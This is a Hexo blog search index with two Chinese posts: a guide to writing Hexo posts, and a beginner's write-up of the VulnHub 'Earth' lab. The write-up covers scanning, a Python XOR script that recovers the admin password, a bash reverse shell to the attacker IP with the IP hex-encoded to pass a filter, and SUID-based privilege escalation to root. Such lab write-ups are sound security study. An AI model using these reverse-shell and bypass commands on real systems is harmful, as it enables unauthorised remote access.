<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>博客文章编写方式</title>
    <url>/2022/10/15/17-58-19/</url>
    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>



<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
<p>然后就是上传图片的操作了</p>
<p>这是原帖子链接</p>
<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
<p>下面我先简单演示</p>
<p>创建一个新的imgs文件夹,位于</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
<p>source 目录下</p>
<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
<p>在”格式””图像””设置图片根目录”</p>
<p>成功后</p>
<p>如图:</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
<p>随后就是插入图片</p>
<p>在”格式” “图像” “插入图片”</p>
<p>一定要记得将图片放在imgs 文件夹中</p>
<p>这样引用图片时才不会出错</p>
<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
<p>最后放上我可爱的草神:</p>
<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
]]></content>
      <categories>
        <category>使用说明</category>
      </categories>
      <tags>
        <tag>hexo博客搭建说明</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次vulnhub靶场Earth的渗透测试</title>
    <url>/2022/10/16/17-55-35/</url>
    <content><![CDATA[<h1 id="记一次vulnhub-靶场-THE-PLANETS-EARTH-靶机渗透攻击思路"><a href="#记一次vulnhub-靶场-THE-PLANETS-EARTH-靶机渗透攻击思路" class="headerlink" title="记一次vulnhub 靶场:THE PLANETS:EARTH 靶机渗透攻击思路"></a>记一次vulnhub 靶场:THE PLANETS:EARTH 靶机渗透攻击思路</h1><h2 id="首先是解决遇到的问题"><a href="#首先是解决遇到的问题" class="headerlink" title="首先是解决遇到的问题:"></a>首先是解决遇到的问题:</h2><p>1.在安装过程中VMware遇到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earth靶机未通过 OVF 规范一致性或虚拟硬件合规性检查。</span><br><span class="line"></span><br><span class="line">请单击“重试”放松 OVF 规范与虚拟硬件合规性检查，并重新尝试导入；或单击“取消”以取消导入。如果重新尝试导入，可能无法使用 VMware Workstation 中的虚拟机。</span><br></pre></td></tr></table></figure>

<p>此问题搜索了许久,还换了一次ofvtool工具文件夹,但最后发现我的ofvtool工具就是最新的4.43版本,圈圈绕绕后转回来点击重试就能运了,其他虚拟机也重启后正常运行.</p>
<p>2.在使用kill扫描端口开放以及IP地址时发现无法扫描到靶机实际IP地址,最后检查发现是虚拟机与物理机的网络桥接模式没有选择正确.</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012103302643.png"></p>
<p>如图,选项NAT模式即可.</p>
<h1 id="正式进入渗透测试"><a href="#正式进入渗透测试" class="headerlink" title="正式进入渗透测试"></a>正式进入渗透测试</h1><h2 id="1-使用kali自带的nmap进行信息收集"><a href="#1-使用kali自带的nmap进行信息收集" class="headerlink" title="1.使用kali自带的nmap进行信息收集"></a>1.使用kali自带的nmap进行信息收集</h2><h3 id="进入kali的root权限"><a href="#进入kali的root权限" class="headerlink" title="进入kali的root权限"></a>进入kali的root权限</h3><p>进入命令行界面,使用:sudo su 命令</p>
<p>输入开机密码后就可以进入root权限</p>
<p>使用 arp-scan -l 命令获取在同一网段下的ip地址,</p>
<p>得:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012104134314.png"></p>
<p>箭头指向地址就是靶机实际IP.</p>
<h3 id="使用nmap进行信息收集"><a href="#使用nmap进行信息收集" class="headerlink" title="使用nmap进行信息收集:"></a>使用nmap进行信息收集:</h3><p>命令:</p>
<p>nmap -O -sV -p- -A 192.168.50.128 -oN earth_namp.txt  </p>
<p>导出成为txt 文档.</p>
<p>信息如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Nmap 7.92 scan initiated Tue Oct 11 21:36:06 2022 as: nmap -O -sV -p- -A -oN earth_namp.txt 192.168.50.128</span><br><span class="line">Nmap scan report for bogon (192.168.50.128)</span><br><span class="line">Host is up (0.00081s latency).</span><br><span class="line">Not shown: 65375 filtered tcp ports (no-response), 157 filtered tcp ports (admin-prohibited)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)</span><br><span class="line">|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br><span class="line">| Not valid before: 2021-10-12T23:26:31</span><br><span class="line">|_Not valid after:  2031-10-10T23:26:31</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">MAC Address: 00:0C:29:08:9F:5A (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.81 ms bogon (192.168.50.128)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct 11 21:38:56 2022 -- 1 IP address (1 host up) scanned in 169.57 seconds</span><br></pre></td></tr></table></figure>

<h3 id="在80端口发现400网站"><a href="#在80端口发现400网站" class="headerlink" title="在80端口发现400网站"></a>在80端口发现400网站</h3><p><img src="/imgs/$%7Bfiilename%7D/image-20221012124608601.png"></p>
<h3 id="443发现两个DNS缓存"><a href="#443发现两个DNS缓存" class="headerlink" title="443发现两个DNS缓存"></a>443发现两个DNS缓存</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br></pre></td></tr></table></figure>

<p>运用kali命令</p>
<p>vim /etc/hosts</p>
<p>破解DNS缓存</p>
<p>修改信息如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	kali2020.kali2020.com	kali2020</span><br><span class="line"></span><br><span class="line">192.168.50.128   earth.local </span><br><span class="line"></span><br><span class="line">192.168.50.128   terratest.earth.local</span><br><span class="line"></span><br><span class="line">#The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>

<p>修改后进入</p>
<p>earth.local </p>
<p>terratest.earth.local</p>
<p>得到如下图</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012124520459.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012185423361.png"></p>
<p>发现两个网站都可以打开了.</p>
<p>在网站下面发现了以前的消息,尝试复制粘贴进去,随便输入了个key,发现并没有返回.</p>
<h3 id="尝试扫描此网站"><a href="#尝试扫描此网站" class="headerlink" title="尝试扫描此网站"></a>尝试扫描此网站</h3><p>发现两个地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---- Scanning URL: http://earth.local/ ----</span><br><span class="line">+ http://earth.local/admin (CODE:301|SIZE:0)                                </span><br><span class="line">+ http://earth.local/cgi-bin/ (CODE:403|SIZE:199)                           </span><br><span class="line">                                                      </span><br></pre></td></tr></table></figure>



<p>一个admin登录界面</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012130229099.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012130305796.png"></p>
<p>在此尝试弱口令登录</p>
<p>简单尝试后发现并没有弱口令(有那么容易就不会出这个靶机了)</p>
<p>尝试在网址框进行报错显示</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012130727867.png"></p>
<p>无法得到有用信息</p>
<p>没有回显而且不像真实网站一样拥有多样化的页面,很难判断出其他信息.</p>
<p>另一个是403页面</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012152918008.png"></p>
<p>另一个网址<a href="http://terratest.earth.local/">http://terratest.earth.local/</a></p>
<p>扫到的网址目录也一样</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012153602283.png"></p>
<p>那么可以尝试更深的扫描</p>
<p>不知道是哪里出错,两个网站都只能扫到admin/login</p>
<p>无法获取到更多信息</p>
<p>md,一直在纠结dirsearch工具,忘了自带的dirb工具</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012182212027.png"></p>
<p>使用dirb命令成功扫到网站目录文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                                                            + https://terratest.earth.local/cgi-bin/ (CODE:403|SIZE:199)                </span><br><span class="line">+ https://terratest.earth.local/index.html (CODE:200|SIZE:26)               </span><br><span class="line">+ https://terratest.earth.local/robots.txt (CODE:200|SIZE:521)              </span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>

<h3 id="得到关键页面"><a href="#得到关键页面" class="headerlink" title="得到关键页面"></a>得到关键页面</h3><p>打开 index.html页面发现</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012183013108-1665916080230.png"></p>
<p>页面显示为: 测试站点，请忽略</p>
<p>继续浏览下一个 robots.txt 页面</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012183252084.png"></p>
<p>得到如图</p>
<p>我们知道 robots.txt 页面主要是</p>
<p>Robots.txt文件是网站跟爬虫间的协议，对于专业SEO并不陌生，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
<p>所以在这个页面里面的文件都是我们能访问的</p>
<p>在页面中我们能知道的文件名只有: testingnotes.*  不知道改文件的后缀</p>
<p>所以我们就要尝试进行后缀名猜测</p>
<p>在这里我们通过别人的攻略可知这是一个.txt文件</p>
<p>访问后内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>翻译一下:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012184433457.png"></p>
<p>翻译一下</p>
<h2 id="发现得到账户名是-terra"><a href="#发现得到账户名是-terra" class="headerlink" title="发现得到账户名是: terra"></a>发现得到账户名是: terra</h2><p>还有一个测试数据文档:testdata.txt</p>
<p>尝试访问这个文档</p>
<p>访问成功:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012184727285.png"></p>
<p>翻译一下</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012184817190.png"></p>
<p>得到了一串看似无用的信息</p>
<p>经过攻略的查找我发现我忽略了一个很重要的信息</p>
<p>*使用XOR<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>作为算法，应该是安全的RSA使用。</p>
<p>testdata.txt用于测试加密。</p>
<p>该账号的登陆密码是使用XOR加密的,所以里面的teatdata.txt文件应该是该密码的加密密文</p>
<p>而网站显示出来的key很可能就是密钥</p>
<p>使用密文密钥解密很可能就能拿到登陆密码</p>
<p>所以我们得进行解密</p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>搜索攻略,按照攻略的做法直接使用kali 解密</p>
<p>然后进入vim xor.py      后创立文档并写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">key1=&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d1&quot;                                   </span><br><span class="line"></span><br><span class="line">decode_txt=b&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;                      </span><br><span class="line"></span><br><span class="line">testdata=binascii.b2a_hex(decode_txt).decode()</span><br><span class="line"></span><br><span class="line">print(hex(int(key1,16)^int(testdata,16)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个攻略直接写了一个python脚本解码</p>
<p>(什么时候才能到这个地步!)</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012192526644.png"></p>
<p>经过一连串转运(其实很容易,搬运就好了,但由于没有认真细心,导致用了很长时间)</p>
<h3 id="得到16进制的密码解密"><a href="#得到16进制的密码解密" class="headerlink" title="得到16进制的密码解密"></a>得到16进制的密码解密</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进制转换后得到密码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>

<p>得到明文,发现密码都是重复的</p>
<h2 id="所以取得密码"><a href="#所以取得密码" class="headerlink" title="所以取得密码:"></a>所以取得密码:</h2><p>earthclimatechangebad4humans</p>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录:"></a>登录:</h3><p>账户: terra</p>
<p>密码:earthclimatechangebad4humans</p>
<h1 id="登陆成功"><a href="#登陆成功" class="headerlink" title="登陆成功:"></a>登陆成功:</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20221012193236664-1665917500677.png"></p>
<p>在这里可以进行任意命令操作</p>
<h2 id="任意命令操作"><a href="#任意命令操作" class="headerlink" title="任意命令操作"></a>任意命令操作</h2><p>此靶场是linux操作系统,所以我们还要学习Linux操作命令</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012193450262.png"></p>
<p>发现可以!</p>
<p>输入 id;ls 可见，为 apache用户，同时显示出了 根目录下的内容，根据 vulnhub 的描述: There are two flags on the box: a user and root flag which include an md5 hash.</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012194450382.png"></p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name “*flag*” </span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20221012194850869.png"></p>
<p>找到flag文件位置</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012195011127.png"></p>
<p>输入读取对应flag文件的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/earth_web/user_flag.txt</span><br></pre></td></tr></table></figure>

<p>得到:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012195236367.png"></p>
<p>[user_flag_3353b67d6437f07ba7d34afd7d2fc27d] </p>
<p>根据靶场说明一共有两个flag</p>
<p>一个在user 一个在 root 下</p>
<h2 id="打算获取远程连接-远程连接的实现知识点"><a href="#打算获取远程连接-远程连接的实现知识点" class="headerlink" title="打算获取远程连接  (远程连接的实现知识点)"></a>打算获取远程连接  (远程连接的实现知识点)</h2><p>发现禁止远程链接</p>
<p><strong>bash -i &gt;&amp; /dev/tcp/192.168.50.128/4444 0&gt;&amp;1</strong></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012200119481.png"></p>
<p>他禁止连接，那我我们来绕过一下，无非就是编码那一套，刚开始我把所有的都给编码了，后来才发现，只需要对IP进行编码就行(按大佬的思路,16进制编码后即可)</p>
<p>192.168.50.128 (我抄,这个位置错了应该是我们自己机器的IP地址,想想也是,妈的傻了)</p>
<p>换成攻击机IP地址:192.168.50.131 </p>
<p>转换成16进制编码</p>
<p>0xc0.0xa8.0x32.0x83</p>
<p>bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x32.0x83/1234 0&gt;&amp;1</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012201429320.png"></p>
<p>成功进行远程链接名令,但我无法使用kali达到监听端口</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012205605679.png"></p>
<p>应该是端口号冲突了</p>
<p>排查完错误后,换个端口号可以成功拿到shell</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013152338953.png"></p>
<h2 id="拿到反弹shell后"><a href="#拿到反弹shell后" class="headerlink" title="拿到反弹shell后"></a>拿到反弹shell后</h2><p>进行信息提权</p>
<p>使用命令</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013154327029.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013154448813.png"></p>
<p>发现三个和靶场说明相关的文件</p>
<p>依次看看</p>
<p>/usr/bin/passwd</p>
<p>/usr/bin/reset_root</p>
<p>/usr/sbin/grub2-set-bootflag</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013154640620.png"></p>
<p>发现需要输入密码,但我们要的就是靶机账户密码  (我应该在得到root密码后再回来看一下这个文件的,但最后忘了)</p>
<p>换个文件</p>
<p>/usr/bin/reset_root</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013155152095.png"></p>
<p>去翻译一下</p>
<p>正在检查是否存在重置触发器。。。</p>
<p>重置失败，所有触发器不存在。</p>
<p>提示为触发器不存在,去看看大佬们的攻略</p>
<p>(我抄看不懂,先跟着做吧)</p>
<p>本地没有调试命令，使用nc传送到本地调试一下</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013161129978.png"></p>
<p>接收文件成功</p>
<p>先给这个文件赋予执行的权限，再进行调试</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013162449927.png"></p>
<p>完成这个过程还学到了三个指令</p>
<p>寻找文件进程指令和杀死文件进程指令</p>
<p>sudo fuser</p>
<p>sudo kill -9</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013162528950.png"></p>
<p>还在fly师傅的指导下学会了 上箭头使用命令行上一个指令</p>
<p>现在进入下一个操作</p>
<p>在靶机上创建这三个文件</p>
<p>/dev/shm/kHgTFI5G</p>
<p>/dev/shm/Zw7bV9U5</p>
<p>/tmp/kcM0Wewe</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013163123164.png"></p>
<p>得到root权限的密码:Earth</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013163414097.png"></p>
<h1 id="更换root权限获取最终flag"><a href="#更换root权限获取最终flag" class="headerlink" title="更换root权限获取最终flag"></a>更换root权限获取最终flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-5.1$ su  </span><br><span class="line">su</span><br><span class="line">Password: Earth</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">root_flag.txt</span><br><span class="line">cat root_flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/image-20221013163912965.png"></p>
<p>拿到最终flag</p>
<p>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>
<p>在earth靶机上认证通过</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221013164136220.png"></p>
<p>这是两个flag</p>
<p>[user_flag_3353b67d6437f07ba7d34afd7d2fc27d] </p>
<p>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</p>
<p>网站账号密码:</p>
<p>账户: terra</p>
<p>密码:earthclimatechangebad4humans</p>
<p>root密码:</p>
<p>Earth</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是我第一次打的的靶机,还涉及到了解密.</p>
<p>从一个网站通过扫描后台目录发现重要文件 “robots.txt”里面存在的测试数据文件</p>
<p>到文件里的文件里的文件借助网站页面显示的密钥破译出密文</p>
<p>得到网站密码</p>
<p>成功登录后台网站</p>
<p>再到借助后台存在的任意命令执行(不知道网站有没有这种漏洞存在)反弹shell拿到靶机普通权限</p>
<p>再一次在靶机里面收集信息,得到root密码文件,通过触发器(不明白这一点)文件修复好这个密码文件,最终取得密码</p>
<p>此经验很好,还学会了一些kali命令,但最重要的还是学会<strong>通关的思路</strong></p>
<p>当我们遇见像靶场中的情况,我们该怎么下手,从哪里开始.</p>
<p>此靶场中的很多知识我目前还没学会</p>
<p>像:远程连接操作 , Linux命令操作 , 还有解密, python, 什么触发器操作等等</p>
<p>打靶场就是检验自己学习的成果,总结前面,计划未来的学习方向.</p>
<p>常看常新!</p>
<p><img src="/imgs/$%7Bfiilename%7D/%E8%8D%89%E7%A5%9E.gif"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场渗透测试</tag>
      </tags>
  </entry>
</search>
